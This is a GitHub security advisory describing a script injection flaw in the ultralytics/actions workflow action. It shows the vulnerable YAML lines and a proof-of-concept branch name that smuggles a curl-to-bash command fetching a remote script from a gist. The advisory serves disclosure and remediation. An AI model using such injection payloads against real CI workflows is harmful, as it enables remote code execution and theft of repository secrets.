# [H] GitHub Actions Script Injection in `ultralytics/actions`

## Summary
Severity: High
Advisory: GHSA-7x29-qqmq-v6qc
CWE: CWE-94
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2024-08-14
Source: https://github.com/advisories/GHSA-7x29-qqmq-v6qc
Type: github-advisory

## Affected
- GitHub Actions: `ultralytics/actions` — affected >=0 <0.0.3

## Details
### Summary

The Ultralytics action available at https://github.com/marketplace/actions/ultralytics-actions is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the `pull_request_target` trigger, then an attacker can inject arbitrary code into that workflow using a crafted branch name.

### Details

The issue exists because the `action.yml` is a composite action and uses certain fields by GitHub context expression within a `run` step:

```
        echo "github.event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}"
        echo "github.ref: ${{ github.ref }}"
        echo "github.head_ref: ${{ github.head_ref }}"
        echo "github.base_ref: ${{ github.base_ref }}"
```

In this case, `github.head_ref` and `github.event.pull_request.head.ref` are user controlled and can be used to inject code.

### PoC

1. Create a fork of any repository that uses `ultralytics/actions` within a workflow that runs on `pull_request_target`.
2. In the fork create a branch as an injection payload, e.g.: `Hacked";{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/6dc549d083b2da1a54d22cc4feac53a4/raw/4b7499772c53085aeedf459d822aee277b5f17a0/poc.sh}${IFS}|${IFS}bash`

3. Create a draft pull request.
4. If the action is reachable, then achieve arbitrary code execution.

![ultra_cve_poc](https://github.com/ultralytics/actions/assets/2006441/b865a54c-38b5-451c-8e93-c497ad6874a2)

See my full POC here (https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201 and https://github.com/AdnaneKhan/Ultralytics_POC), where I created a test workflow that used the action and achieved arbitrary execution using another account by creating a pull request from a fork.

### Impact

Any workflow that uses the action and runs on `pull_request_target` is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to abuse the `GITHUB_TOKEN` or steal secrets from the workflow.

### Fix

Sanitize the user-controlled variables using environment vars.

## References
- https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc
- https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a
- https://github.com/ultralytics/actions
